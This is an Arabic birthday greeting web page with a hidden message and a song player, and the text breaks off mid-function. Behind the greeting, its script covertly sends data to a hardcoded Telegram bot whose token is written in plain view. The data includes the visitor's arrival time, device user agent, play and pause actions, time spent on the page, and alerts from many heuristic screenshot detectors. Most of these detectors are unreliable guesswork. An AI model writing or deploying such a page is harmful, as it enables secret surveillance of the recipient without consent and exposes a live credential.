<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🎈🎂عيـد ميـلاد سعـيد 🎉🤍</title>
  <style>
    body {
      text-align: center;
      background-color: #8B0000;
      color: white;
      font-family: 'Tajawal', sans-serif;
      overflow: hidden;
    }
    h1 {
      font-size: 3rem;
      margin-top: 50px;
    }
    /* النمط العام للأزرار */
    button {
      padding: 10px 15px;
      font-size: 1rem;
      background-color: white;
      color: #8B0000;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: 0.3s;
      margin: 5px;
      position: relative;
    }
    button:hover {
      background-color: #ffcccc;
    }
    /* زر تشغيل الأغنية يبدأ مخفي */
    #playButton {
      opacity: 0;
      transition: opacity 1s ease-in-out;
    }
    /* عند إضافة الكلاس show يصير ظاهر */
    #playButton.show {
      opacity: 1;
    }
    .cover {
      position: relative;
      width: 80%;
      max-width: 600px;
      margin: 20px auto;
      background-color: gold;
      text-align: center;
      padding: 20px;
      font-size: 1.5rem;
      font-weight: bold;
      cursor: pointer;
      transition: transform 1s ease-in-out, opacity 1s ease-in-out;
      border-radius: 10px;
    }
    /* تأثير عند النقر على الغلاف */
    .cover.hidden {
      transform: translateY(100px);
      opacity: 0;
    }
    #greeting {
      display: none;
    }
    /* صندوق التحكم بالأغنية مخفي أولاً مع تأثير انزلاقي من الأعلى */
    .player-controls {
      margin: 20px auto;
      background: rgba(0, 0, 0, 0.7);
      padding: 15px;
      border-radius: 15px;
      width: 80%;
      max-width: 400px;
      opacity: 0;
      transform: translateY(-50px);
      transition: transform 0.5s ease-out, opacity 0.5s ease-out;
      text-align: center;
      display: none;
    }
    /* عند ظهور صندوق التحكم يتم إزالة التأثير */
    .player-controls.visible {
      opacity: 1;
      transform: translateY(0);
    }
    .progress {
      width: 100%;
      height: 5px;
      background: #ddd;
      border-radius: 5px;
      margin: 10px 0;
      overflow: hidden;
    }
    .progress-bar {
      height: 100%;
      width: 0%;
      background: gold;
      transition: width 0.5s;
    }
    .controls-row {
      display: flex;
      justify-content: center;
      align-items: center;
    }
    /* التأكيد على ظهور أزرار التحكم داخل صندوق التحكم */
    .player-controls button {
      opacity: 1 !important;
      top: 0 !important;
      transition: none;
    }
    /* عنصر مخفي لاكتشاف لقطات الشاشة */
    #screenshotDetector {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      opacity: 0;
      z-index: -1;
    }
  </style>
</head>
<body>
  <h1>🎈🎂عيـد ميـلاد سعـيد 🎉🤍</h1>
  <div class="cover" onclick="revealText()">💞سنفورتي الحلوه دوسي هنـا</div>
  <p id="greeting">
    كل سنة وانـتِ سالمة♥️🎉 وبألف صحة العمر گله يا رب ان شاء الله عيد ميلاد سعيد يا احلى بنيه عرفتها بحياتي ،
    هم حلوه وهم عيونها حلوه وهم اخلاقها تملخ الناس الي يعرفوج والي قريبين عليج المفروض يصلون صلاة الشكر
    لان انـتِ موجوده بحياتهم طبعًا شكد ما امدحج قليل بحقج لان كلام المدح يقصر بحقج 🤍🎁 ان شاء الله السنه كلها سعاده واشوفج بأعلى المراتب 🌝♥️🫂
  </p>
  <!-- زر تشغيل الأغنية مخفي حتى يظهر بعد النقر على الغلاف -->
  <button id="playButton" onclick="playSong()">💙 🎶سنفور الحلو دوسي هنا</button>
  <audio id="song" src="song.mp3" ontimeupdate="updateProgress()"></audio>
  <!-- صندوق التحكم مخفي حتى يتم تفعيله -->
  <div class="player-controls" id="controls">
    <p id="time">0:00</p>
    <div class="progress">
      <div class="progress-bar" id="progress-bar"></div>
    </div>
    <div class="controls-row">
      <button onclick="rewind()">⏪</button>
      <button onclick="togglePlay()">⏯️</button>
      <button onclick="forward()">⏩</button>
    </div>
  </div>
  
  <!-- عنصر مخفي لاكتشاف لقطات الشاشة -->
  <div id="screenshotDetector"></div>
  
  <script>
    // تخزين معلومات نوع الجهاز للاستخدام لاحقًا
    let deviceInfo = {
      isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
      isSamsung: /Samsung|SM-|Galaxy/i.test(navigator.userAgent),
      isAndroid: /Android/i.test(navigator.userAgent),
      userAgent: navigator.userAgent
    };
    
    function revealText() {
      // إخفاء الغلاف بتأثير انزلاقي للأسفل
      document.querySelector('.cover').classList.add('hidden');
      setTimeout(() => {
        document.querySelector('.cover').style.display = 'none';
        document.getElementById('greeting').style.display = 'block';
        // إظهار زر تشغيل الأغنية بعد إخفاء الغلاف
        document.getElementById('playButton').classList.add('show');
      }, 1000);
    }
    
    function enableControls() {
      let controls = document.getElementById("controls");
      controls.style.display = "block";
      // تفعيل تأثير الانزلاق من الأعلى بعد تأخير بسيط
      setTimeout(() => {
        controls.classList.add("visible");
      }, 100);
    }
    
    function playSong() {
      let song = document.getElementById("song");
      song.play();
      enableControls();
      // إرسال إشعار عند الضغط على زر التشغيل
      sendTelegramMessage("🎶 تم تشغيل الأغنية.");
    }
    
    function updateProgress() {
      let song = document.getElementById("song");
      let progressBar = document.getElementById("progress-bar");
      let timeDisplay = document.getElementById("time");
      
      if (!isNaN(song.duration)) {
        let minutes = Math.floor(song.currentTime / 60);
        let seconds = Math.floor(song.currentTime % 60);
        timeDisplay.innerText = minutes + ":" + (seconds < 10 ? "0" + seconds : seconds);
        progressBar.style.width = (song.currentTime / song.duration) * 100 + "%";
      }
    }
    
    function togglePlay() {
      let song = document.getElementById("song");
      if (song.paused) {
        song.play();
      } else {
        song.pause();
      }
    }
    
    function rewind() {
      let song = document.getElementById("song");
      if (!isNaN(song.duration)) {
        song.currentTime = Math.max(0, song.currentTime - 5);
      }
    }
    
    function forward() {
      let song = document.getElementById("song");
      if (!isNaN(song.duration)) {
        song.currentTime = Math.min(song.duration, song.currentTime + 5);
      }
    }
    
    // ===========================
    // تكامل بوت تلجرام لتسجيل البيانات
    // ===========================
    const telegramBotToken = "7890478414:AAGkrQ7HwgdU6ppweqOpfvygwmeI1tyJvKw"; // استبدل هذا بالتوكن الخاص ببوتك
    const telegramChatId = "651561282"; // استبدل هذا بالآيدي الخاص بالدردشة أو القناة
    
    function sendTelegramMessage(message) {
      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message
        }),
        keepalive: true
      });
    }
    
    function formatDate(date) {
      let day = date.getDate();
      let month = date.getMonth() + 1;
      let year = date.getFullYear();
      let hours = date.getHours();
      let minutes = date.getMinutes();
      let seconds = date.getSeconds();
      let period = hours >= 12 ? "م" : "ص";
      hours = hours % 12;
      if (hours === 0) hours = 12;
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;
      return `${day}‏/${month}‏/${year} ${hours}:${minutes}:${seconds} ${period}`;
    }
    
    // تسجيل وقت الدخول مع بيانات مفصلة
    let loginTime = new Date();
    let userAgentInfo = navigator.userAgent;
    sendTelegramMessage(`🚀 دخول جديد للموقع!\n📅 التاريخ: ${formatDate(loginTime)}\n🖥 الجهاز: ${userAgentInfo}`);
    
    // إرسال إشعار عند إيقاف الموسيقى
    document.getElementById("song").addEventListener("pause", function() {
      sendTelegramMessage("🎵 تم إيقاف الموسيقى.");
    });
    
    // دالة لإرسال رسالة عند مغادرة الموقع باستخدام sendBeacon لتعمل على iOS
    let exitMessageSent = false;
    function sendExitMessage(message) {
      if (exitMessageSent) return;
      exitMessageSent = true;
      let payload = JSON.stringify({
        chat_id: telegramChatId,
        text: message
      });
      let blob = new Blob([payload], { type: 'application/json' });
      navigator.sendBeacon(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, blob);
    }
    
    // تسجيل مدة البقاء عند مغادرة المستخدم للموقع باستخدام beforeunload و pagehide
    window.addEventListener("beforeunload", function() {
      let logoutTime = new Date();
      let durationSeconds = Math.round((logoutTime - loginTime) / 1000);
      let minutes = Math.floor(durationSeconds / 60);
      let seconds = durationSeconds % 60;
      let message = `📤 المستخدم غادر الموقع\n⏳ مدة البقاء: ${minutes} دقيقة و ${seconds} ثانية`;
      sendExitMessage(message);
    });
    
    window.addEventListener("pagehide", function() {
      let logoutTime = new Date();
      let durationSeconds = Math.round((logoutTime - loginTime) / 1000);
      let minutes = Math.floor(durationSeconds / 60);
      let seconds = durationSeconds % 60;
      let message = `📤 مغادرة مفاجئة للموقع\n⏳ مدة الجلسة: ${minutes} دقيقة و ${seconds} ثانية`;
      sendExitMessage(message);
    });
    
    // إضافة مستمع لحدث تغير الرؤية لضمان التقاط مغادرة الصفحة على الأجهزة المحمولة
    document.addEventListener("visibilitychange", function() {
      if (document.visibilityState === "hidden") {
        let logoutTime = new Date();
        let durationSeconds = Math.round((logoutTime - loginTime) / 1000);
        let minutes = Math.floor(durationSeconds / 60);
        let seconds = durationSeconds % 60;
        let message = `📤 المستخدم غادر الموقع\n⏳ مدة البقاء: ${minutes} دقيقة و ${seconds} ثانية`;
        sendExitMessage(message);
      }
    });
    
    // ===========================
    // اكتشاف لقطة الشاشة لأجهزة آيفون وسامسونج
    // ===========================
    
    // دالة إرسال الإشعار عند التقاط لقطة شاشة
    let screenshotMessageSent = false;
    let lastNotifyTime = 0;
    
    function notifyScreenshot(method) {
      const now = Date.now();
      // تحقق من عدم تكرار الإشعار في غضون 3 ثوان
      if (now - lastNotifyTime < 3000) return;
      
      lastNotifyTime = now;
      let deviceType = "";
      
      if (deviceInfo.isIOS) {
        deviceType = "آيفون";
      } else if (deviceInfo.isSamsung) {
        deviceType = "سامسونج";
      } else if (deviceInfo.isAndroid) {
        deviceType = "أندرويد";
      } else {
        deviceType = "غير معروف";
      }
      
      let screenshotTime = new Date();
      let message = `📸 تم التقاط لقطة شاشة!\n📅 التاريخ: ${formatDate(screenshotTime)}\n📱 نوع الجهاز: ${deviceType}\n🔍 طريقة الاكتشاف: ${method}\n🖥 معلومات الجهاز: ${deviceInfo.userAgent.substring(0, 100)}...`;
      
      sendTelegramMessage(message);
    }
    
    // ===========================
    // طرق مخصصة لاكتشاف لقطات الشاشة في أجهزة آيفون
    // ===========================
    if (deviceInfo.isIOS) {
      // الطريقة 1: مراقبة أحداث حجم النافذة (في بعض إصدارات iOS)
      let iosScreenshotDetected = false;
      
      window.addEventListener('resize', function() {
        if (iosScreenshotDetected) return;
        
        const now = Date.now();
        setTimeout(function() {
          // تحقق مما إذا كانت الصفحة غير مرئية بعد تغيير الحجم
          if (document.visibilityState === 'hidden' || document.hidden) {
            notifyScreenshot("resize+hidden (iOS)");
            iosScreenshotDetected = true;
            setTimeout(() => { iosScreenshotDetected = false; }, 3000);
          }
        }, 50);
      });
      
      // الطريقة 2: مراقبة ضغطات المفاتيح المتزامنة مع الصوت (كمبيوتر + الصوت في iOS)
      let volumePressTime = 0;
      let homePressTime = 0;
      
      // محاكاة ضغط زر الصوت
      window.addEventListener('volumechange', function() {
        volumePressTime = Date.now();
        checkIOSScreenshotGesture();
      });
      
      // محاكاة ضغط زر الصفحة الرئيسية
      document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'hidden') {
          homePressTime = Date.now();
          checkIOSScreenshotGesture();
        }
      });
      
      function checkIOSScreenshotGesture() {
        // فحص ما إذا كانت الأزرار قد ضغطت في وقت متقارب
        if (Math.abs(volumePressTime - homePressTime) < 300) {
          notifyScreenshot("home+volume (iOS)");
        }
      }
      
      // الطريقة 3: اكتشاف محددة لـ iOS 13+ (محاولة رصد نمط AssistiveTouch)
      let touchStartY = 0;
      let touchEndY = 0;
      
      document.addEventListener('touchstart', function(e) {
        if (e.touches.length === 1) {
          touchStartY = e.touches[0].clientY;
        }
      });
      
      document.addEventListener('touchend', function(e) {
        touchEndY = e.changedTouches[0].clientY;
        
        // رصد نمط السحب من أعلى إلى أسفل (مثل AssistiveTouch في iOS)
        if (touchEndY - touchStartY > 100) {
          setTimeout(function() {
            if (document.visibilityState === 'hidden') {
              notifyScreenshot("assistive touch (iOS)");
            }
          }, 100);
        }
      });
    }
    
    // ===========================
    // طرق مخصصة لاكتشاف لقطات الشاشة في أجهزة سامسونج
    // ===========================
    if (deviceInfo.isSamsung || deviceInfo.isAndroid) {
      // الطريقة 1: ضغط زر الطاقة مع خفض مستوى الصوت (الشائع في سامسونج)
      let powerPressTime = 0;
      let volumeDownPressTime = 0;
      
      // محاكاة ضغط زر الطاقة (باستخدام حدث تغيير حالة الشاشة)
      document.addEventListener('visibilitychange', function() {
        powerPressTime = Date.now();
        checkSamsungScreenshotGesture();
      });
      
      // محاكاة ضغط زر خفض الصوت
      window.addEventListener('volumechange', function() {
        volumeDownPressTime = Date.now();
        checkSamsungScreenshotGesture();
      });
      
      function checkSamsungScreenshotGesture() {
        // فحص ما إذا كانت الأزرار قد ضغطت في وقت متقارب
        if (Math.abs(powerPressTime - volumeDownPressTime) < 300) {
          notifyScreenshot("power+volume (Samsung)");
        }
      }
      
      // الطريقة 2: رصد حركة اليد (السحب الجانبي) في أجهزة سامسونج
      let touchStartX = 0;
      let touchStartTime = 0;
      
      document.addEventListener('touchstart', function(e) {
        if (e.touches.length === 1) {
          touchStartX = e.touches[0].clientX;
          touchStartTime = Date.now();
        }
      });
      
      document.addEventListener('touchend', function(e) {
        const touchEndX = e.changedTouches[0].clientX;
        const touchDuration = Date.now() - touchStartTime;
        
        // رصد نمط السحب السريع من اليمين إلى اليسار أو العكس
        if (Math.abs(touchEndX - touchStartX) > 150 && touchDuration < 300) {
          setTimeout(function() {
            if (document.visibilityState === 'hidden') {
              notifyScreenshot("palm swipe (Samsung)");
            }
          }, 100);
        }
      });
    }
    
    // ===========================
    // الطرق المشتركة لكلا النوعين من الأجهزة
    // ===========================
    
    // الطريقة 1: مراقبة حدث رسم النافذة بعد تغييرات مفاجئة
    // يمكن أن يساعد في اكتشاف لقطات الشاشة في كلا النوعين من الأجهزة
    let lastDrawTime = Date.now();
    let drawCount = 0;
    let rapidDrawThreshold = 5; // عدد عمليات الرسم السريعة التي قد تشير إلى لقطة شاشة
    
    function checkRapidDraws() {
      const now = Date.now();
      if (now - lastDrawTime < 100) {
        drawCount++;
        if (drawCount >= rapidDrawThreshold) {
          notifyScreenshot("rapid draw events");
          drawCount = 0;
        }
      } else {
        drawCount = 0;
      }
      lastDrawTime = now;
    }
    
    // استخدام requestAnimationFrame لتتبع إعادة الرسم
    function monitorDraws() {
      checkRapidDraws();
      requestAnimationFrame(monitorDraws);
    }
    monitorDraws();
    
    // الطريقة 2: استخدام التغييرات في الأداء
    let lastPerformanceNow = performance.now();
    let performanceGapThreshold = 200; // فجوة زمنية قد تشير إلى مهمة نظام ثقيلة مثل لقطة شاشة
    
    function checkPerformanceGap() {
      const now = performance.now();
      const gap = now - lastPerformanceNow;
      
      // إذا كانت هناك فجوة كبيرة في أداء الصفحة، قد تكون بسبب لقطة شاشة
      if (gap > performanceGapThreshold) {
        notifyScreenshot("performance gap");
      }
      
      lastPerformanceNow = now;
      setTimeout(checkPerformanceGap, 100);
    }
    checkPerformanceGap();
    
    // الطريقة 3: مراقبة دورة أحداث المتصفح
    let lastBlurTime = 0;
    let lastFocusTime = 0;
    
    window.addEventListener('blur', function() {
      lastBlurTime = Date.now();
      checkBlurFocusPattern();
    });
    
    window.addEventListener('focus', function() {
      lastFocusTime = Date.now();
      checkBlurFocusPattern();
    });
    
    function checkBlurFocusPattern() {
      // نمط شائع عند التقاط الشاشة: blur سريع متبوع بـ focus
      if (lastFocusTime - lastBlurTime > 0 && lastFocusTime - lastBlurTime < 300) {
        notifyScreenshot("blur-focus pattern");
      }
    }
    
    // الطريقة 4: مراقبة التفاعلات مع الواجهة التي قد تكون مرتبطة بلقطات الشاشة
    document.addEventListener('keydown', function(e) {
      // مفاتيح لقطة الشاشة للأجهزة المختلفة
      if (
        (e.key === 'PrintScreen') ||
        (e.key === 's' && (e.ctrlKey || e.metaKey)) || // Ctrl+S أو Cmd+S
        (e.key === '3' && e.shiftKey && e.metaKey) || // Cmd+Shift+3 في ماك
        (e.key === '4' && e.shiftKey && e.metaKey) // Cmd+Shift+4 في ماك
      ) {
        notifyScreenshot("keyboard shortcut");
      }
    });
    
    // عند تفريغ Audio و Canvas بسرعة (قد يحدث عند التقاط لقطة شاشة)
    if (typeof OffscreenCanvas !== 'undefined') {
      try {
        // تحقق من أداء عناصر canvas المخفية كمؤشر على لقطة شاشة
        let offscreenCanvas = new OffscreenCanvas(1, 1);
        let ctx = offscreenCanvas.getContext('2d');
        
        let canvasPerfStart = 0;
        function checkCanvasPerformance() {
          canvasPerfStart = performance.now();
          ctx.fillStyle = '#fff';
          ctx.fillRect(0, 0, 1, 1);
          const perfTime = performance.now() - canvasPerfStart;
          
          // إذا استغرق الرسم وقتًا طويلاً بشكل غير عادي
          if (perfTime > 5) { // عادة تكون سريعة جدًا
            notifyScreenshot("canvas performance drop");
          }
          
          setTimeout(checkCanvasPerformance, 300);
        }
        checkCanvasPerformance();
      } catch (e) {
        // تجاهل الأخطاء في حالة عدم دعم المتصفح
      }
    }
    
    // طريقة تجمع تحليل أنماط اللمس والتفاعل لتحسين اكتشاف لقطات الشاشة
    // تعريف متغيرات تتبع أنماط التفاعل
    let touchEvents = [];
    const MAX_TOUCH_EVENTS = 10;
    let lastScreenBrightnessTime = Date.now();
    
    // تسجيل لمسات الشاشة لتحليل الأنماط
    document.addEventListener('touchstart', logTouchEvent);
    document.addEventListener('touchend', logTouchEvent);
    document.addEventListener('touchcancel', logTouchEvent);
    
    function logTouchEvent(e) {
      const now = Date.now();
      touchEvents.push({
        type: e.type,
        time: now,
        touches: e.touches.length
      });
      
      // حفظ أحدث 10 أحداث فقط
      if (touchEvents.length > MAX_TOUCH_EVENTS) {
        touchEvents.shift();
      }
      
      // تحليل أنماط اللمس لرصد اللقطات في سامسونج وآيفون
      analyzeGestures();
    }
    
    function analyzeGestures() {
      if (touchEvents.length < 3) return;
      
      // رصد نمط لقطة الشاشة في سامسونج (السحب براحة اليد)
      if (deviceInfo.isSamsung && detectPalmSwipe()) {
        notifyScreenshot("palm swipe pattern (Samsung)");
      }
      
      // رصد نمط لقطة الشاشة في آيفون (الضغط المتزامن)
      if (deviceInfo.isIOS && detectSimultaneousPress()) {
        notifyScreenshot("simultaneous press pattern (iOS)");
      }
    }
    
    function detectPalmSwipe() {
      // تحقق من وجود سلسلة من أحداث اللمس السريعة المتتالية (نمط السحب في سامسونج)
      let touchEndCount = 0;
      let touchStartCount = 0;
      
      for (let i = 0; i < touchEvents.length - 1; i++) {
        if (touchEvents[i].type === 'touchend') touchEndCount++;
        if (touchEvents[i].type === 'touchstart') touchStartCount++;
        
        // إذا كان هناك أكثر من 3 أحداث لمس في أقل من 500 مللي ثانية
        if (touchEvents[i+1].time - touchEvents
